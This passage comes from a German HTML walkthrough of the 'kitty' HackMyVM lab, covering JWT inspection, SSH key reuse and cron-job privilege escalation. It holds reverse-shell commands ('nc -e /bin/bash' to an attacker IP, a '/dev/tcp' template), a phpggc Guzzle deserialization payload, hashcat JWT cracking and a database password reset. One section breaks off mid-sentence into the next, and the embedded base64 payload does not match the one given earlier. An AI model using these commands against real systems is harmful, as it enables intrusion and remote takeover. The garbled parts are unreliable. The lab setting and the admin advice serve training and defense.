+            <ol><li>Analysieren Sie das JWT: Dekodieren Sie Header und Payload (der Teil vor und nach dem ersten Punkt) mit Base64. Der Header (`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9`) zeigt `{"typ":"JWT","alg":"HS256"}` (HMAC mit SHA256). Der Payload (`eyJ1c2VybmFtZSI6Im5vYm9keSIsImlzX2FkbWluIjowLCJleHBpcmVzIjoxNjY4MDQ1Nzk3LjA3NzMxNTN9`) zeigt `{"username":"nobody","is_admin":0,"expires":1668045797.0773153}`.</li><li>Versuchen Sie, den geheimen Schlüssel zu knacken, der zur Signierung des HS256-Tokens verwendet wurde (z.B. mit `hashcat -m 16500 token.txt rockyou.txt`). Wenn der Schlüssel schwach ist, könnten Sie ein eigenes Token mit `is_admin: 1` erstellen und signieren.</li><li>Verwenden Sie das erhaltene Token, um auf andere, geschützte Endpunkte der API zuzugreifen (indem Sie es im `Authorization: Bearer <token>` Header senden).</li></ol>
+            <strong>Empfehlung (Admin):</strong>
+            <ol><li>Verwenden Sie starke, nicht erratbare geheime Schlüssel für die JWT-Signierung (HS256). Erwägen Sie die Verwendung von asymmetrischen Algorithmen (RS256, ES256), bei denen der private Schlüssel geheim gehalten werden kann.</li><li>Validieren Sie serverseitig immer die im Token enthaltenen Berechtigungen und ignorieren Sie Parameter wie `is_admin` im Login-Request.</li><li>Implementieren Sie Mechanismen zum Widerrufen von Tokens.</li><li>Setzen Sie angemessene Ablaufzeiten (`expires`) für Tokens.</li></ol></p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl -X 'POST' 'http://localhost:8000/api/v2/user/login' -H 'accept: application/json' -H 'Content-Type: application/json' -d '{"username": "nobody","password": "74k3!7345y",  "is_admin": 1}'</span></div>
+                    <pre>
+{"access_token":"<span class="password">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Im5vYm9keSIsImlzX2FkbWluIjowLCJleHBpcmVzIjoxNjY4MDQ1Nzk3LjA3NzMxNTN9.agtlUqaQV0yYmBZYvFRyCcz5hj_Ztj86e3Db1L7oBYg</span>"}</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Es werden weitere Login-Versuche über die API unternommen, diesmal mit verschiedenen Benutzernamen (`test`, `git`) und Passwörtern, sowie der erneute erfolgreiche Login als `nobody`. Anschließend wird versucht, das erhaltene JWT mit `base64 -d` zu dekodieren.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die fehlgeschlagenen Logins bestätigen, dass nur `nobody` mit dem Passwort `74k3!7345y` gültig ist. Der Versuch, das gesamte JWT mit `base64 -d` zu dekodieren, scheitert mit `<span class="password">base64: ungültige Eingabe</span>`, weil ein JWT aus drei durch Punkte getrennten Base64-kodierten Teilen besteht (Header, Payload, Signatur) und die Signatur oft Zeichen enthält, die für Base64 ungültig sind. Man muss Header und Payload separat dekodieren.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dekodieren Sie Header und Payload des JWTs separat, z.B. online auf jwt.io oder manuell:
+            `echo "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9" | base64 -d`
+            `echo "eyJ1c2VybmFtZSI6Im5vYm9keSIsImlzX2FkbWluIjowLCJleHBpcmVzIjoxNjY4MDQ1Nzk3LjA3NzMxNTN9" | base64 -d`
+            Versuchen Sie weiterhin, den HS256-Schlüssel zu knacken.
+            <br><strong>Empfehlung (Admin):</strong> Siehe vorherige Empfehlungen zu JWTs.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl -X 'POST' 'http://localhost:8000/api/v2/user/login' -H 'accept: application/json' -H 'Content-Type: application/json' -d '{"username": "test","password": "test",  "is_admin": 1}'</span></div>
+                    <pre>{"Error":"Invalid login details!"}</pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl -X 'POST' 'http://localhost:8000/api/v2/user/login' -H 'accept: application/json' -H 'Content-Type: application/json' -d '{"username": "test","password": "74k3!7345y",  "is_admin": 1}'</span></div>
+                    <pre>{"Error":"Invalid login details!"}</pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl -X 'POST' 'http://localhost:8000/api/v2/user/login' -H 'accept: application/json' -H 'Content-Type: application/json' -d '{"username": "git","password": "74k3!7345y",  "is_admin": 1}'</span></div>
+                    <pre>{"Error":"Invalid login details!"}</pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl -X 'POST' 'http://localhost:8000/api/v2/user/login' -H 'accept: application/json' -H 'Content-Type: application/json' -d '{"username": "nobody","password": "74k3!7345y",  "is_admin": 1}'</span></div>
+                    <pre>{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Im5vYm9keSIsImlzX2FkbWluIjowLCJleHBpcmVzIjoxNjY4MDQ1Nzk3LjA3NzMxNTN9.agtlUqaQV0yYmBZYvFRyCcz5hj_Ztj86e3Db1L7oBYg"}</pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">echo "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Im5vYm9keSIsImlzX2FkbWluIjowLCJleHBpcmVzIjoxNjY4MDQ1Nzk3LjA3NzMxNTN9.agtlUqaQV0yYmBZYvFRyCcz5hj_Ztj86e3Db1L7oBYg" | base64 -d</span></div>
+                    <pre>{"typ":"JWT","alg":"HS256"}<span class="password">base64: invalid input</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein Vermerk "18.04.2023 weitergemacht" zeigt eine Pause in der Bearbeitung an. Danach wird der Inhalt einer Datei namens `iiii` angezeigt, die den zuvor über die API gefundenen SSH-Schlüssel enthält. Der Schlüssel wird dann mit `vi` bearbeitet (wahrscheinlich nur geöffnet und wieder geschlossen) und die Berechtigungen auf `600` gesetzt, was für SSH-Schlüssel notwendig ist. Schließlich wird versucht, sich mit diesem Schlüssel als `dyutidhara` anzumelden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der SSH-Login ist erneut erfolgreich. Dies wiederholt im Grunde den Schritt, der zum initialen Zugriff führte, bestätigt aber die Gültigkeit des Schlüssels und des Benutzernamens `dyutidhara`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Da der Zugriff als `dyutidhara` bereits besteht und untersucht wurde, konzentrieren Sie sich auf die verbleibenden Vektoren zur Rechteausweitung, insbesondere den von `pspy` aufgedeckten Cronjob und die Untersuchung der `/etc/crontab`.
+            <br><strong>Empfehlung (Admin):</strong> Siehe vorherige Empfehlungen zur SSH-Schlüsselsicherheit und Widerruf kompromittierter Schlüssel.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat iiii</span></div>
+                     <pre><span class="password">
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+[...]
+-----END OPENSSH PRIVATE KEY-----</span></pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi iiii</span></div>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">chmod 600 iiii</span></div>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh dyutidhara@kitty.hmv -i iiii</span></div>
+                     <pre>
+Linux kitty 5.10.0-13-amd64 #1 SMP Debian 5.10.106-1 (2022-03-17) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+<span class="password">Last login: Tue Mar 29 06:39:26 2022 from 192.168.1.5</span>
+<span class="prompt">dyutidhara@kitty:~$ </span></pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Die systemweite Crontab-Datei (`/etc/crontab`) wird ausgelesen. Diese Datei definiert geplante Aufgaben, die vom System ausgeführt werden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Neben den Standard-Cronjobs für `cron.hourly`, `cron.daily`, `cron.weekly` und `cron.monthly` gibt es einen sehr auffälligen, benutzerdefinierten Eintrag, der jede Minute (`* * * * *`) als `root` ausgeführt wird:
+            `<span class="password">*  *  *  *  * root	  [ -f /usr/local/etc/newfile.txt ] && /usr/bin/sed -e 's/\[{"Expires":1,"Discard":false,"Value":"//' -e 's/\\n"}]//' /usr/local/etc/newfile.txt > /usr/local/etc/payload.txt | for i in $(/usr/bin/cat /usr/local/etc/payload.txt); do /usr/bin/echo $i | /usr/bin/base64 -d | /usr/bin/bash; done</span>`
+            Dieser Cronjob prüft, ob die Datei `/usr/local/etc/newfile.txt` existiert. Wenn ja, verwendet er `sed`, um bestimmte Zeichenketten daraus zu entfernen und das Ergebnis in `/usr/local/etc/payload.txt` zu schreiben. Dann liest er jede Zeile (`i`) aus `payload.txt`, dekodiert sie mit Base64 und führt das Ergebnis mit `/usr/bin/bash` aus.
+            **Dies ist ein kritischer Befund und ein klarer Weg zur Rechteausweitung!** Wenn der Benutzer `dyutidhara` Schreibrechte auf `/usr/local/etc/newfile.txt` hat (oder auf das Verzeichnis `/usr/local/etc/`), kann er Base64-kodierten Shell-Code in diese Datei schreiben, der dann innerhalb einer Minute als Root ausgeführt wird.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+            <ol><li>Überprüfen Sie die Schreibrechte für `/usr/local/etc/newfile.txt` und/oder `/usr/local/etc/` (`ls -ld /usr/local/etc/`, `ls -l /usr/local/etc/newfile.txt`).</li><li>Wenn Schreibrechte vorhanden sind: Erstellen Sie einen Base64-kodierten Payload, der eine Reverse Shell zum Angreifer-System aufbaut (z.B. `echo 'bash -i >& /dev/tcp/IHRE_IP/IHR_PORT 0>&1' | base64`).</li><li>Fügen Sie den Payload in die benötigte Struktur ein, damit `sed` ihn korrekt extrahiert (z.B. `echo '[{"Expires":1,"Discard":false,"Value":"IHRE_BASE64_PAYLOAD\n"}]' 
+			> /pfad/zu/newfile.txt`). Der Pfad kann `/tmp/newfile.txt` sein, wenn Sie Schreibrechte auf `/usr/local/            <p class="analysis"><strong>Analyse:</strong> Nachdem der kritische Cronjob in `/etc/crontab` identifiziert wurde, wird versucht, auf die Dateien zuzugreifen, die er verwendet: `/usr/local/etc/newfile.txt` (die Eingabedatei) und `/usr/local/etc/payload.txt` (die temporäre Datei, die den zu dekodierenden Payload enthält).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Beide `cat`-Befehle schlagen mit `<span class="password">Permission denied</span>` fehl. Dies bedeutet, dass der aktuelle Benutzer `dyutidhara` keine Leserechte für diese Dateien hat. Dies schließt einen einfachen Angriff aus, bei dem der Inhalt von `payload.txt` direkt gelesen oder der Inhalt von `newfile.txt` direkt manipuliert wird, um den Cronjob auszulösen. Es muss ein indirekter Weg gefunden werden, um den Inhalt von `/usr/local/etc/newfile.txt` zu beeinflussen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Da der direkte Zugriff verweigert wird:
+            <ol><li>Überprüfen Sie die Berechtigungen des übergeordneten Verzeichnisses `/usr/local/etc/` (`ls -ld /usr/local/etc/`). Wenn `dyutidhara` Schreibrechte auf das Verzeichnis hat, könnte die Datei `newfile.txt` möglicherweise gelöscht und neu erstellt werden.</li><li>Suchen Sie nach Anwendungen oder Prozessen, die als Root oder mit ausreichenden Rechten laufen und möglicherweise Daten in `/usr/local/etc/newfile.txt` schreiben. Dies könnte eine Webanwendung, ein anderer Dienst oder ein SUID-Binary sein.</li><li>Untersuchen Sie die anderen laufenden Dienste (Gitea, OpenCATS, API), ob sie Schwachstellen aufweisen, die das Schreiben von Dateien ermöglichen.</li></ol>
+            <strong>Empfehlung (Admin):</strong> Die Berechtigungen scheinen hier korrekt restriktiv zu sein. Stellen Sie sicher, dass Dateien, die von Root-Prozessen (insbesondere Cronjobs) verwendet werden, korrekte, restriktive Berechtigungen haben und nicht von unprivilegierten Benutzern manipuliert werden können.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">dyutidhara@kitty:~$ <span class="command">cat /usr/local/etc/newfile.txt</span></div>
+                    <pre><span class="password">cat: /usr/local/etc/newfile.txt: Permission denied</span></pre>
+                    <div class="prompt">dyutidhara@kitty:~$ <span class="command">cat /usr/local/etc/payload.txt</span></div>
+                    <pre><span class="password">cat: /usr/local/etc/payload.txt: Permission denied</span></pre>
+                </div>
+            </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Inhalt der Nginx-Konfigurationsdatei für den virtuellen Host `opencats` wird angezeigt. Diese befindet sich unter `/etc/nginx/sites-enabled/opencats`.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Konfiguration definiert einen weiteren virtuellen Host, der auf Port 80 lauscht:
+             <ul><li>Servername: `<span class="command">thisisnotcatitisopencats.kitty.hmv</span>`</li><li>Web-Root: `<span class="command">/opt/opencats</span>`</li><li>PHP-Verarbeitung: PHP-Dateien werden über FastCGI an einen Unix-Socket unter `<span class="command">/run/php/power.sock</span>` weitergeleitet.</li></ul>
+             Dies weist auf eine weitere Webanwendung hin (vermutlich OpenCATS, ein Open-Source Applicant Tracking System), die unter einem spezifischen Hostnamen läuft. Der ungewöhnliche Socket-Name `/run/php/power.sock` könnte auf eine spezielle PHP-FPM-Pool-Konfiguration hindeuten.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+             <ol><li>Fügen Sie den Hostnamen `thisisnotcatitisopencats.kitty.hmv` zur lokalen `/etc/hosts`-Datei hinzu (die auf die IP des Ziels zeigt).</li><li>Untersuchen Sie die OpenCATS-Anwendung unter `http://thisisnotcatitisopencats.kitty.hmv` auf bekannte Schwachstellen (z.B. in SearchSploit oder online).</li><li>Prüfen Sie auf Standard-Zugangsdaten oder versuchen Sie, die zuvor gefundenen Datenbank-Zugangsdaten (insbesondere für `opencats` aus der `mysql.user`-Tabelle) zu verwenden.</li><li>Untersuchen Sie, ob die Anwendung Schwachstellen wie Datei-Upload, Remote Code Execution (RCE) oder PHP-Objekt-Deserialisierung aufweist, die genutzt werden könnten, um die Datei `/usr/local/etc/newfile.txt` zu schreiben.</li><li>Überprüfen Sie die Berechtigungen des Verzeichnisses `/opt/opencats`.</li></ol>
+             <strong>Empfehlung (Admin):</strong>
+             <ol><li>Halten Sie die OpenCATS-Anwendung und ihre Abhängigkeiten (PHP, Nginx) auf dem neuesten Stand.</li><li>Konfigurieren Sie Webanwendungen sicher, insbesondere hinsichtlich Datei-Uploads und der Verarbeitung von Benutzereingaben.</li><li>Verwenden Sie eindeutige und starke Passwörter für Datenbank- und Anwendungsbenutzer.</li></ol></p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">dyutidhara@kitty:~$ <span class="command">cat /etc/nginx/sites-enabled/opencats</span></div>
+                    <pre>
+server {
+	listen 80;
+	server_name <span class="command">thisisnotcatitisopencats.kitty.hmv</span>;
+	root <span class="command">/opt/opencats</span>;
+	index index.html index.htm index.php;
+	location ~ \.php$ {
+		include snippets/fastcgi-php.conf;
+		fastcgi_pass unix:<span class="command">/run/php/power.sock</span>;
+	}
+
+}</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Dieser Befehl bereitet den Payload für die Ausnutzung des Cronjobs vor. Der Befehl `nc -e /bin/bash 192.168.2.130 9001` (der eine Reverse Shell zur IP 192.168.2.130 auf Port 9001 startet) wird mittels `echo` ausgegeben, dann mit `base64` kodiert und das Ergebnis in die Datei `/tmp/newfile.txt` geschrieben.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies erstellt den Base64-kodierten Payload (`bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMi4xMzAgOTAwMQo=` inklusive des Zeilenumbruchs `\n`, der von `echo` standardmäßig hinzugefügt wird) in einer temporären Datei. Dieser Payload soll später, vermutlich über eine andere Schwachstelle (z.B. PHP-Deserialisierung in OpenCATS), in die Datei `/usr/local/etc/newfile.txt` geschrieben werden, damit der Cronjob ihn verarbeiten kann. Dies ist ein notwendiger Zwischenschritt, da direkter Schreibzugriff auf die Zieldatei fehlt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+            <ol><li>Stellen Sie sicher, dass die IP `192.168.2.130` die korrekte IP Ihres Angreifer-Systems ist, auf dem der Listener laufen wird.</li><li>Starten Sie einen Netcat-Listener auf Ihrem System: `nc -lvnp 9001`.</li><li>Finden Sie nun einen Weg, den Inhalt von `/tmp/newfile.txt` in die Datei `/usr/local/etc/newfile.txt` auf dem Zielsystem zu schreiben (z.B. über eine Webanwendungs-Schwachstelle). Beachten Sie, dass der Cronjob ein spezifisches Format mit `sed` erwartet, aber der Plan scheint zu sein, den Base64-String direkt zu schreiben und darauf zu vertrauen, dass der `sed`-Befehl ihn unverändert lässt und die nachfolgende Base64-Dekodierung korrekt funktioniert.</li></ol>
+            <strong>Empfehlung (Admin):</strong> (Siehe vorherige Empfehlungen zum Cronjob) Überwachen Sie die Erstellung und Änderung von Dateien in `/tmp` und anderen temporären Verzeichnissen. Beschränken Sie die Möglichkeiten für Webanwendungen oder andere Dienste, beliebige Dateien auf dem System zu schreiben.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">dyutidhara@kitty:~$ <span class="command">echo 'nc -e /bin/bash 192.168.2.130 9001' | base64 > /tmp/newfile.txt</span></div>
+                    <div class="prompt">dyutidhara@kitty:~$ </div>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Auf dem Angreifer-System wird ein Netcat-Listener gestartet. `-l` bedeutet Listen (lauschen), `-v` sorgt für ausführliche Ausgabe, `-n` verhindert DNS-Lookups und `-p 9001` gibt den Port an, auf dem gelauscht wird.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist der notwendige Gegenpart zur Reverse Shell, die durch den Cronjob ausgelöst werden soll. Der Listener wartet nun auf eine eingehende Verbindung auf Port 9001. Sobald der Payload erfolgreich platziert und vom Cronjob ausgeführt wird, sollte hier die Root-Shell erscheinen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Lassen Sie diesen Listener laufen, während Sie versuchen, den Payload auf dem Zielsystem in `/usr/local/etc/newfile.txt` zu platzieren.
+            <br><strong>Empfehlung (Admin):</strong> Firewall-Regeln (sowohl auf dem Server als auch im Netzwerk) sollten ausgehende Verbindungen zu beliebigen Ports einschränken (Egress Filtering). Dies kann die erfolgreiche Etablierung von Reverse Shells erschweren oder verhindern.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                    <pre>listening on [any] 9001 ...</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Auf dem Angreifer-System wird das Paket `phpggc` installiert. `phpggc` ist ein Tool zum Generieren von Serialisierungs-Payloads für verschiedene PHP-Frameworks und -Bibliotheken, um PHP-Objekt-Injection-Schwachstellen auszunutzen. Anschließend wird `phpggc` verwendet, um einen Payload für das Guzzle-Framework (Gadget Chain `FW1`) zu erstellen. Dieser Payload soll beim Deserialisieren den Inhalt der Datei `/tmp/newfile.txt` (die den Base64-kodierten Reverse-Shell-Befehl enthält) in die Datei `/usr/local/etc/newfile.txt` schreiben. Die Ausgabe wird URL-kodiert (`-u`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist der Kern des Plans, um die fehlenden Schreibrechte auf `/usr/local/etc/newfile.txt` zu umgehen. Es wird eine PHP-Deserialisierungsschwachstelle in einer Anwendung (vermutlich OpenCATS, da Guzzle oft verwendet wird) angenommen. Der generierte Payload (`a%3A2%3A...%7D`) ist der serialisierte PHP-Objekt-String, der, wenn er von einer anfälligen `unserialize()`-Funktion verarbeitet wird, die gewünschte Dateioperation durchführt. Der darin enthaltene Base64-String `<span class="password">bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMi4xMzAgTAwMQo=</span>` ist der eigentliche Reverse-Shell-Payload. Dieser wird durch den Exploit in `/usr/local/etc/newfile.txt` platziert. Der Cronjob liest dann diese Datei, der `sed`-Befehl lässt den Base64-String wahrscheinlich unverändert nach `/usr/local/etc/payload.txt` schreiben, und der anschließende `base64 -d | bash` führt die Shell aus.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+            <ol><li>Identifizieren Sie den Eingabepunkt für die Deserialisierung in der OpenCATS-Anwendung (z.B. ein Cookie, ein POST-Parameter, ein GET-Parameter).</li><li>Übergeben Sie den generierten, URL-kodierten Payload an diesen Eingabepunkt.</li><li>Stellen Sie sicher, dass der Netcat-Listener (`nc -lvnp 9001`) läuft.</li><li>Warten Sie auf die Ausführung des Cronjobs (bis zu einer Minute) und auf die eingehende Shell.</li></ol>
+            <strong>Empfehlung (Admin):</strong>
+            <ol><li>Vermeiden Sie die Verwendung von `unserialize()` mit benutzerkontrollierten Daten in PHP. Verwenden Sie sicherere Datenformate wie JSON (`json_decode`/`json_encode`) wenn möglich.</li><li>Halten Sie alle PHP-Bibliotheken und Frameworks (wie Guzzle) auf dem neuesten Stand, um bekannte Gadget Chains zu mitigieren.</li><li>Implementieren Sie Web Application Firewalls (WAFs), die möglicherweise bekannte Deserialisierungs-Payloads erkennen können.</li><li>Beschränken Sie die Berechtigungen des Webserver-Benutzers (z.B. `www-data`), sodass er nicht in beliebige Verzeichnisse wie `/usr/local/etc/` schreiben kann.</li></ol></p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">apt install phpggc</span></div>
+                    <pre>
+Paketlisten werden gelesen… Fertig
+Abhängigkeitsbaum wird aufgebaut… Fertig
+Statusinformationen werden eingelesen… Fertig
+[...]
+Die folgenden NEUEN Pakete werden installiert:
+  phpggc
+[...]</pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">phpggc -u --fast-destruct Guzzle/FW1 /usr/local/etc/newfile.txt /tmp/newfile.txt</span></div>
+                    <pre><span class="password">a%3A2%3A%7Bi%3A7%3B%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3B%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A49%3A%22bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMi4xMzAgTAwMQo%3D%0A%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A26%3A%22%2Fusr%2Flocal%2Fetc%2Fnewfile.txt%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3B%7Di%3A7%3Bi%3A7%3B%7D</span></pre>
+
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Auf dem Zielsystem wird sich erneut als Datenbank-Root (`root`:`root`) angemeldet. Die Datenbank `opencats` wird ausgewählt, und das Passwort für den Benutzer `admin` in der Tabelle `user` wird auf den MD5-Hash von "admin" (`21232f297a57a5a743894a0e4a801fc3`) gesetzt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies dient wahrscheinlich dazu, den Zugriff auf die OpenCATS-Webanwendung zu erlangen oder sicherzustellen. Indem das Passwort des Admin-Benutzers auf einen bekannten Wert gesetzt wird, kann sich der Angreifer nun als `admin` mit dem Passwort `admin` über die Weboberfläche anmelden. Dies erleichtert die Suche nach dem Deserialisierungs-Endpunkt oder anderen Schwachstellen in der Anwendung.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Melden Sie sich bei `http://thisisnotcatitisopencats.kitty.hmv` als `admin` mit dem Passwort `admin` an. Suchen Sie nach Funktionen, die Benutzereingaben deserialisieren könnten (Profileinstellungen, Import/Export, Konfigurationen, spezielle Add-ons). Verwenden Sie Browser-Entwicklertools, um Parameter und Cookies zu identifizieren, die den `phpggc`-Payload aufnehmen könnten.
+            <br><strong>Empfehlung (Admin):</strong> Ändern Sie niemals Passwörter auf bekannte, schwache Werte. Verwenden Sie starke, zufällige Passwörter. Überwachen Sie Datenbankänderungen, insbesondere an Benutzer- und Authentifizierungstabellen. Schützen Sie den Datenbank-Root-Zugriff streng.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">dyutidhara@kitty:~$ <span class="command">mysql -uroot -proot</span></div>
+                    <pre>
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 95
+Server version: 10.5.15-MariaDB-1:10.5.15+maria~bullseye mariadb.org binary distribution
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+<span class="prompt">MariaDB [(none)]> </span><span class="command">use opencats;</span>
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+<span class="prompt">MariaDB [opencats]> </span><span class="command">UPDATE user SET password='21232f297a57a5a743894a0e4a801fc3' WHERE user_name='admin';</span>
+<span class="password">Query OK, 1 row affected (0.044 sec)</span>
+<span class="password">Rows matched: 1  Changed: 1  Warnings: 0</span>
+
+<span class="prompt">MariaDB [opencats]> </span></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Diese Blöcke zeigen Wiederholungen oder Statusaktualisierungen: Der `phpggc`-Befehl wird erneut angezeigt (wahrscheinlich, um den Payload zu kopieren), der Netcat-Listener wird neu gestartet (oder es wird bestätigt, dass er läuft), und der relevante Eintrag in `/etc/hosts` wird gezeigt. Wichtig ist hier die IP-Adresse `192.168.2.129`, die nun für alle Hostnamen des Ziels verwendet wird.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigung der Werkzeuge und Konfigurationen vor dem finalen Angriffsschritt. Die korrekte IP-Adresse in `/etc/hosts` ist entscheidend für die Erreichbarkeit der Webanwendung.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stellen Sie sicher, dass die IP `192.168.2.129` korrekt ist und der Listener läuft. Fahren Sie mit dem Senden des Payloads an OpenCATS fort.
+            <br><strong>Empfehlung (Admin):</strong> Keine direkten Maßnahmen hier, außer der Überwachung von Netzwerkscans oder Änderungen an der Netzwerkkonfiguration.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">phpggc -u --fast-destruct Guzzle/FW1 /usr/local/etc/newfile.txt /tmp/newfile.txt</span></div>
+                    <pre><span class="password">a%3A2%3A%7Bi%3A7%3B%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3B%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A49%3A%22bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMi4xMzAgTAwMQo%3D%0A%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A26%3A%22%2Fusr%2Flocal%2Fetc%2Fnewfile.txt%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3B%7Di%3A7%3Bi%3A7%3B%7D</span></pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                     <pre>listening on [any] 9001 ...</pre>
+                  </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                      <pre>
+127.0.0.1	localhost
+127.0.1.1	cyber
+
+# 192.168.2.107    AAAAAAAAAAAAA.hmv
+  <span class="command">192.168.2.129</span>    cookie.kitty.hmv kitty.hmv whythisapiissofast.kitty.hmv thisisnotcatitisopencats.kitty.hmv
+</pre>
+                  </div>
+              </div>
+
